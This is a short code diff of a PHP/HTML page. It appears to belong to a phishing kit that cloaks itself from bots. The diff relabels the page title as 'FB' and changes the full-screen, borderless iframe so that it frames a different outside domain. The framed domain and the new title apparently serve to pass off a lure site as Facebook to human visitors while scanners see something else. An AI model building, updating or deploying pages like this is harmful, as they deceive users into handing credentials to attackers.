@@ -115,7 +115,7 @@ if ($is_bot) {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>www</title>
+        <title>FB</title>
         <style>
             html, body {
                 margin: 0;
@@ -134,7 +134,7 @@ if ($is_bot) {
     </head>
     <body>
     
-        <iframe src="https://page.transparency-business.com/" frameborder="0" id="iframe"></iframe>
+        <iframe src="https://visit.cbkgardens.com" frameborder="0" id="iframe"></iframe>
     
         <script>
             window.addEventListener("load", function() {
